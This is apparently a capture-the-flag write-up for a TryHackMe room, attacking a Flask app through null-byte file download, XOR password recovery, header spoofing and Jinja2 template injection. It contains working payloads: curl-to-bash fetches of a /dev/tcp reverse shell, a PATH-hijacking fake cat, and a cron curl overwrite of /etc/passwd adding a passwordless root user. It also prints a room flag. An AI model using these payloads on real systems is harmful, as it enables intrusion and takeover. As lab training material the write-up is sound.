# thm: Super Secret TIp

https://tryhackme.com/room/supersecrettip

## Enumeration

The first step is to perform basic enumeration using Nmap. 

```
$ nmap <target ip>
PORT     STATE SERVICE
22/tcp   open  ssh
7777/tcp open  cbt
```
The target was scanned on ports 22 and 7777, with version detection and default script execution enabled

```
$ nmap -sV -sC -p 22,7777 <target ip>
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 3e:b8:18:ef:45:a8:df:59:bf:11:49:4b:1d:b6:b8:93 (RSA)
|   256 0b:cf:f9:94:06:85:97:f6:bd:cc:33:66:4e:26:ea:27 (ECDSA)
|_  256 60:ce:be:2d:1e:f0:18:00:30:70:ff:a2:66:d7:85:f7 (ED25519)
7777/tcp open  cbt?
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Server: Werkzeug/2.3.4 Python/3.11.0
...
```
```
$ gobuster -u http://<target ip>:7777 -w ~/Downloads/wordlists/common.txt
/debug (Status: 200)
/cloud (Status: 200)
```
The /debug page appears to require a bypass for access. On the /cloud page, only the first three files and the last file are retrievable, while all other requests return 404 Not Found.

	http://<target ip>:7777/debug?debug=test&password=test

This endpoint accepts two query parameters:

- debug: appears to control the debug functionality.
- password:  used to restrict access to debugging features.

To enumerate potential files within the /cloud endpoint, wfuzz was utilized with a POST request targeting the download parameter. The goal was to identify accessible Python files while filtering out 404 Not Found responses.
```
$ wfuzz -u http://<target ip>:7777/cloud -X POST -d 'download=FUZZ.py' -w /usr/share/wfuzz/wordlist/general/common.txt --hc 404
000000773:   200        86 L     250 W      2898 Ch     "source"                                                                                                                                                              
000000826:   200        3 L      8 W        45 Ch       "templates"                                                                        
```
source.py: 
```
$ curl -X POST -d "download=source.py" http://<target ip>:7777/cloud -o source.py && cat source.py
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  2916  100  2898  100    18   2056     12  0:00:01  0:00:01 --:--:--  2068
from flask import *
import hashlib
import os
import ip # from .
import debugpassword # from .
import pwn

app = Flask(__name__)
app.secret_key = os.urandom(32)
password = str(open('supersecrettip.txt').readline().strip())

def illegal_chars_check(input):
    illegal = "'&;%"
    error = ""
    if any(char in illegal for char in input):
        error = "Illegal characters found!"
        return True, error
    else:
        return False, error

@app.route("/cloud", methods=["GET", "POST"]) 
def download():
    if request.method == "GET":
        return render_template('cloud.html')
    else:
        download = request.form['download']
        if download == 'source.py':
            return send_file('./source.py', as_attachment=True)
        if download[-4:] == '.txt':
            print('download: ' + download)
            return send_from_directory(app.root_path, download, as_attachment=True)
        else:
            return send_from_directory(app.root_path + "/cloud", download, as_attachment=True)
            # return render_template('cloud.html', msg="Network error occurred")

@app.route("/debug", methods=["GET"]) 
def debug():
    debug = request.args.get('debug')
    user_password = request.args.get('password')
    
    if not user_password or not debug:
        return render_template("debug.html")
    result, error = illegal_chars_check(debug)
    if result is True:
        return render_template("debug.html", error=error)

    # I am not very eXperienced with encryptiOns, so heRe you go!
    encrypted_pass = str(debugpassword.get_encrypted(user_password))
    if encrypted_pass != password:
        return render_template("debug.html", error="Wrong password.")
    
    
    session['debug'] = debug
    session['password'] = encrypted_pass
        
    return render_template("debug.html", result="Debug statement executed.")

@app.route("/debugresult", methods=["GET"]) 
def debugResult():
    if not ip.checkIP(request):
        return abort(401, "Everything made in home, we don't like intruders.")
    
    if not session:
        return render_template("debugresult.html")
    
    debug = session.get('debug')
    result, error = illegal_chars_check(debug)
    if result is True:
        return render_template("debugresult.html", error=error)
    user_password = session.get('password')
    
    if not debug and not user_password:
        return render_template("debugresult.html")
        
    # return render_template("debugresult.html", debug=debug, success=True)
    
    # TESTING -- DON'T FORGET TO REMOVE FOR SECURITY REASONS
    template = open('./templates/debugresult.html').read()
    return render_template_string(template.replace('DEBUG_HERE', debug), success=True, error="")

@app.route("/", methods=["GET"])
def index():
    return render_template('index.html')

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=7777, debug=False)

```

```
$ curl http://<target ip>:7777/cloud -X POST -d 'download=supersecrettip.txt'
b' \x00\x00\x00\x00%\x1c\r\x03\x18\x06\x1e'
```

This `supersecrettip.txt` file contained a sequence of bytes that required decryption. In the debug function, comments highlighted the uppercase letters “X”, “O”, and “R”, strongly suggesting that the data had been encrypted using XOR. 

Direct download of debugpassword file, however, was not possible due to the application’s download() function. This function explicitly restricted downloads to either source.py or files with a .txt extension. Consequently, the debugpassword file could not be retrieved directly.

To overcome this limitation, a **null-byte injection** takes advantage of how certain frameworks handle string termination. A null byte (%00 in URL encoding or \x00 in raw form) can prematurely terminate a string, effectively truncating the value at the injection point.  appending a null byte before the forbidden extension may bypass the validation check while still allowing the server’s file-handling function to process the real filename.

```
$ curl http://<target ip>:7777/cloud -X POST -d 'download=debugpassword.py%00.txt'
import pwn

def get_encrypted(passwd):
    return pwn.xor(bytes(passwd, 'utf-8'), b'ayham')

```
Next, let's write a qwuick script to decode given key with this function.

```
$ cat decode.py 
#!/bin/python3
import pwn

def get_encrypted(passwd):
    return pwn.xor(bytes(passwd, 'utf-8'), b'ayham')

input = b' \x00\x00\x00\x00%\x1c\r\x03\x18\x06\x1e'
utf8text = input.decode('utf-8', errors='replace')
print(utf8text)
print(get_encrypted(utf8text)) 
$ python3 ./decode.py 
\x03\x18\x06\x1e
b'AyhamDeebugg'
```

With the decoded password, the check was bypassed and the debug statement executed successfully.

	http://<target ip>:7777/debug?debug=test&password=AyhamDeebugg

Before jumping straight into debugresult.html, there were two things that needed to be handled since it gives unauthrized error 401.

```
def debugResult():
    if not ip.checkIP(request):
        return abort(401, "Everything made in home, we don't like intruders.")
    
    if not session:
        return render_template("debugresult.html")
```

The app was checking the client’s IP before giving access.

```
$ curl http://<target ip>:7777/cloud -X POST -d 'download=ip.py%00.txt'
host_ip = "127.0.0.1"
def checkIP(req):
    try:
        return req.headers.getlist("X-Forwarded-For")[0] == host_ip
    except:
        return req.remote_addr == host_ip
```
A common trick here is using the X-Forwarded-For (XFF) header, which normally tells a server what the original client IP was if traffic went through a proxy or load balancer. If the app trusts this header without validating it, just spoof it by adding

	X-Forwarded-For: 127.0.0.1

This basically makes the server think the request is coming from localhost, which is usually trusted.

Plus, the page expected a session cookie to be set. Without it, access was denied. Once the right cookie was added to the request, the page could be reached successfully.
```
$ curl 'http://<target ip>:7777/debug?debug=test&password=AyhamDeebugg' -I
HTTP/1.1 200 OK
Server: Werkzeug/2.3.4 Python/3.11.0
Date: Thu, 11 Sep 2025 12:47:15 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 2024
Vary: Cookie
Set-Cookie: session=.eJyrVkpJTSpNV7JSKkktLlHSUSpILC4uzy9KAYokqSvExFQYGKARqkDSMDkmpgjEMwZxLEAsMxArVV2pFgBkyRqO.aMLE0w.94wUAt4ME8clyOUcGZj5vfblXsU; HttpOnly; Path=/
Connection: close
```

**Payload:**
```
$ curl 'http://<target ip>:7777/debugresult' -H 'X-Forwarded-For: 127.0.0.1' -b 'session=.eJyrVkpJTSpNV7JSKkktLlHSUSpILC4uzy9KAYokqSvExFQYGKARqkDSMDkmpgjEMwZxLEAsMxArVV2pFgBkyRqO.aMLE0w.94wUAt4ME8clyOUcGZj5vfblXsU'
```

The web app is running Flask and passes user input directly into render_template_string without proper sanitization. This function takes a string and evaluates it as a Jinja2 template. This means anything inside {{ … }} is executed by the server. Testing with {{ 7*7 }} returned 49, confirming that **Server-Side Template Injection (SSTI)** works.

First, retrieve a vaild session cookie.
```
$ curl 'http://<target ip>:7777/debug?debug=\{\{7*7\}\}&password=AyhamDeebugg' -I
HTTP/1.1 200 OK
Server: Werkzeug/2.3.4 Python/3.11.0
Date: Thu, 11 Sep 2025 12:56:24 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 2024
Vary: Cookie
Set-Cookie: session=.eJyrVkpJTSpNV7JSqq421zKvrVXSUSpILC4uzy9KAQomqSvExFQYGKARqkDSMDkmpgjEMwZxLEAsMxArVV2pFgCp1xtW.aMLG-A.u9-65vYwbdk5vAvpJErjvQuz7MQ; HttpOnly; Path=/
Connection: close
```
Next, cpoy the session cookie and paste into the payload.
```
$ curl 'http://<target ip>:7777/debugresult' -H 'X-Forwarded-For: 127.0.0.1' -b 'session=.eJyrVkpJTSpNV7JSqq421zKvrVXSUSpILC4uzy9KAQomqSvExFQYGKARqkDSMDkmpgjEMwZxLEAsMxArVV2pFgCp1xtW.aMLG-A.u9-65vYwbdk5vAvpJErjvQuz7MQ'
<body>

    <div class="main">
        <h1 class="title">Debugging Results</h1>
<pre>
<code>

┌──(ayham㉿AM-Kali)-[~]
└─$ debugging
<span class="result">49</span>

</code>
</pre>

</body>
</html>
```
It gives 49(7*7) so the web app seems like it is susceptible to SSTI. 

## Exploit

The point is the template prevents directly importing os (or other modules). To execute system commands, it is necessary to find an indirect way to reach the os module.
    
    self.__init__.__globals__.__builtins__.__import__("os").popen("ls").read()

it accesses the Python os module through the template environment and executes the ls command on the server and reads its output. 'hello' → object → subclasses → sys → os

    >> 'hello'.__class__.__base__.__subclasses__()[144].__init__.__globals__['sys'].modules['os'].popen('/bin/bash').read() 

When rendered by Flask’s `render_template_string`, this returns the list of files in the current directory.

Jinja doesn’t allow direct imports like os, so a dynamic path is needed to reach it. By exploring Python’s object hierarchy, it is possible to find objects that already reference modules such as sys. In this case,

    'hello'.__class__.__base__.__subclasses__()[144]

(a warning-related class) contains a reference to sys, which then provides access to os.

Next, a valid session cookie is retrieved using the command above.
```
$ curl 'http://<target ip>:7777?debug=\{\{+self.__init__.__globals__.__builtins__.__import__("os").popen("ls").read()+\}\}&password=AyhamDeebugg' -I
HTTP/1.1 200 OK
Server: Werkzeug/2.3.4 Python/3.11.0
Date: Thu, 11 Sep 2025 13:06:14 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 2024
Vary: Cookie
Set-Cookie: session=.eJxdzdEKwyAMheFXkcBoC6O0DMbYswREpy1CpqItHYjvvtjd7ebwfxBIAWP1vsITShHZ0jJK6bzbpORYKWhF-Wy9O9qc_8G9Y0h80yOEjDCMMUTrWXQqWWX6QdQKV4gq5yMkwx90JxA_0_Q3F975hZiabg2PVvdWtoP6BR8XNrM.aMLJRg.CxOuQOAaCgSq1wV8M6jUEvZgMis; HttpOnly; Path=/
Connection: close
```
Next, cpoy session cookie and paste into the payload.

```
$ curl 'http://<target ip>:7777/debugresult' -H 'X-Forwarded-For: 127.0.0.1' -b 'session=.eJxdzdEKwyAMheFXkcBoC6O0DMbYswREpy1CpqItHYjvvtjd7ebwfxBIAWP1vsITShHZ0jJK6bzbpORYKWhF-Wy9O9qc_8G9Y0h80yOEjDCMMUTrWXQqWWX6QdQKV4gq5yMkwx90JxA_0_Q3F975hZiabg2PVvdWtoP6BR8XNrM.aMLJRg.CxOuQOAaCgSq1wV8M6jUEvZgMis'
<body>

    <div class="main">
        <h1 class="title">Debugging Results</h1>
<pre>
<code>

┌──(ayham㉿AM-Kali)-[~]
└─$ debugging
<span class="result">__pycache__
cloud
debugpassword.py
ip.py
source.py
static
supersecrettip.txt
templates
</span>

</code>
</pre>

</body>
```

The ls command was successfully executed. However, retrieving the session cookie by directly typing a command fails, so obtaining a shell on the target machine is necessary.

A reverse shell can be implemented within the template. Since an illegal character check function exists, the reverse shell must avoid using any illegal characters.

	\{\{+self.__init__.__globals__.__builtins__.__import__("os").popen("bash -i >& /dev/tcp/<machine ip>/<port> 0>&1").read()+\}\} 

This attempt failed due to the presence of an illegal character (&). Another payload must be created. One approach is to curl the reverse shell from the attacker server and execute it via bash simultaneously.

**Step 1**. Create reverse shell reverse_shell.sh:

	$ echo 'bash -i >& /dev/tcp/<machine ip>/4444 0>&1' > reverse_shell.sh

**Step 2**. start python simple http server on the other terminal.

    $ python3 -m http.server 8888

**Step 3**. curl reverse_shell.sh from our server.

	\{\{+self.__init__.__globals__.__builtins__.__import__("os").popen("curl+<machine ip>:8888/ex.sh+|+bash").read()+\}\} 

**Step 4**. start a netcat listener to retrieve reverse_shell connection. 

    $ nc -lnvp 4444


The next step is to repeat the process. First, a valid session cookie is retrieved using this payload.

```
$ curl 'http://<target ip>:7777/debug?debug=\{\{+self.__init__.__globals__.__builtins__.__import__("os").popen("curl+<machine ip>:8888/reverse_shell.sh+|+bash").read()+\}\}&password=AyhamDeebugg' -I
HTTP/1.1 200 OK
Server: Werkzeug/2.3.4 Python/3.11.0
Date: Thu, 11 Sep 2025 14:18:20 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 2024
Vary: Cookie
Set-Cookie: session=.eJxdjuEKgjAUhV9lXAgVYjkEK59lMDa96WC5sasVmO_eVv-6Pw7fB-fA3WBAs47QwbYxQnfjStnZLkolGJ032tGXzWrdYuef2HvwMXVKCZ4kVDz4gHOyfo2OiZqLM29aLq5Nd0l3ivjASKhoQuc4TezNjKYpLyPqoazYvsMRgiZ6-jikb0zBpHzV9V8cUopeypityXLJ1GbCAvYPfjZEIg.aMLaLA.yPVy108tPXGksF8mTyN6dMtI1D4; HttpOnly; Path=/
Connection: close
```
Next, cpoy session cookie and paste into the payload.

```
$ curl 'http://<target ip>:7777/debugresult' -H 'X-Forwarded-For: 127.0.0.1' -b 'session=.eJxdjuEKgjAUhV9lXAgVYjkEK59lMDa96WC5sasVmO_eVv-6Pw7fB-fA3WBAs47QwbYxQnfjStnZLkolGJ032tGXzWrdYuef2HvwMXVKCZ4kVDz4gHOyfo2OiZqLM29aLq5Nd0l3ivjASKhoQuc4TezNjKYpLyPqoazYvsMRgiZ6-jikb0zBpHzV9V8cUopeypityXLJ1GbCAvYPfjZEIg.aMLaLA.yPVy108tPXGksF8mTyN6dMtI1D4'
```

Then it can be observed that netcat has connected and a shell has been obtained.
```
$ nc -lnvp 4444
Listening on 0.0.0.0 4444
ayham@482cbf2305ae:/app$ cd ..
cd ..
ayham@482cbf2305ae:~$ ls
ls
flag1.txt
ayham@482cbf2305ae:~$ cat flag1.txt
cat flag1.txt
THM{LFI_1s_Pr33Ty_Aw3s0Me_1337}
```

## Privilege Escalation

Next, upload linpeas.sh from our python http server to scan the whole system to see any vulnerability.
```
ayham@482cbf2305ae:~$ wget http://<machine ip>:8888/linpeas.sh
ayham@482cbf2305ae:~$ chmod +x linpeas.sh
chmod +x linpeas.sh
ayham@482cbf2305ae:~$ ./linpeas.sh
./linpeas.sh
```
```
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.daily; }
47 6    * * 7   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.weekly; }
52 6    1 * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.monthly; }
*  *    * * *   root    curl -K /home/F30s/site_check
*  *    * * *   F30s    bash -lc 'cat /home/F30s/health_check'
```
From the linpeas.sh output, it can be observed that the command

    $ bash -lc 'cat /home/F30s/health_check'

is executed. This indicates that bash acts as a login shell, initializing /etc/profile or .profile. In this scenario, a custom $PATH can be added to .profile. Since the cat command is not invoked with a full path, a fake cat binary can be created that functions as a reverse shell for the user F30s.
```
ayham@482cbf2305ae:~$ echo 'bash -i >& /dev/tcp/<machine ip>/5555 0>&1' > /tmp/cat
<h -i >& /dev/tcp/<machine ip>/5555 0>&1' > /tmp/cat
ayham@482cbf2305ae:~$ chmod +x /tmp/cat
chmod +x /tmp/cat
ayham@482cbf2305ae:~$ echo 'PATH="/tmp/:$PATH"' >> /home/F30s/.profile
echo 'PATH="/tmp/:$PATH"' >> /home/F30s/.profile
```
on the other terminal, start netcat listener

    $ nc -lnvp 5555

After few seconds netcat got reverse shell. 

```
$ nc -lnvp 5555
Listening on 0.0.0.0 5555
Connection received on 10.201.81.200 53598
bash: cannot set terminal process group (357): Inappropriate ioctl for device
bash: no job control in this shell
F30s@482cbf2305ae:~$
```

Note that the user F30s cannot use the normal cat command because the $PATH was modified. To execute the fake /tmp/cat binary, the full path must be provided. 
```
F30s@482cbf2305ae:~$ ls
ls
health_check
site_check
F30s@482cbf2305ae:~$ /bin/cat ./health_check
/bin/cat ./health_check
Health: 1337/100
F30s@482cbf2305ae:~$ /bin/cat ./site_check
/bin/cat ./site_check
url = "http://127.0.0.1/health_check"
F30s@482cbf2305ae:~$ ls -la
ls -la
total 36
drwxr-xr-x 1 F30s F30s 4096 Jun 24  2023 .
drwxr-xr-x 1 root root 4096 Jun 24  2023 ..
-rw-r--r-- 1 F30s F30s  220 Mar 27  2022 .bash_logout
-rw-r--r-- 1 F30s F30s 3526 Mar 27  2022 .bashrc
-rw-r--rw- 1 F30s F30s  826 Sep 11 14:21 .profile
-rw-r--r-- 1 root root   17 May 19  2023 health_check
-rw-r----- 1 F30s F30s   38 May 22  2023 site_check
```
Analysis shows that cron will execute `curl -K /home/F30s/site_check` as root. The site_check file can be manipulated. By appending output=/etc/passwd to the end of the site_check configuration file, it may be possible to overwrite /etc/passwd and create a fake root user. This demonstrates a significant privilege escalation opportunity.
```
$ cat passwd  
echo 'root1::0:0:root1:/home/root1:/bin/bash' >> passwd
$ python3 -m http.server 8888
Serving HTTP on 0.0.0.0 port 8888 (http://0.0.0.0:8888/) ...
```

```
F30s@482cbf2305ae:~$ echo 'url = "http://<machine ip>:8888/passwd"' > site_check
<l = "http://<machine ip>:8888/passwd"' > site_check
F30s@482cbf2305ae:~$ echo 'output="/etc/passwd"' >> site_check
echo 'output="/etc/passwd"' >> site_check
F30s@482cbf2305ae:~$ su root1
su root1
whoami
root1
python -c 'import pty; pty.spawn("/bin/bash")'
root1@482cbf2305ae:/home/F30s# cd /root
cd /root
root1@482cbf2305ae:/root# ls
ls
flag2.txt  secret.txt
root1@482cbf2305ae:/root# cat flag2.txt
cat flag2.txt
```


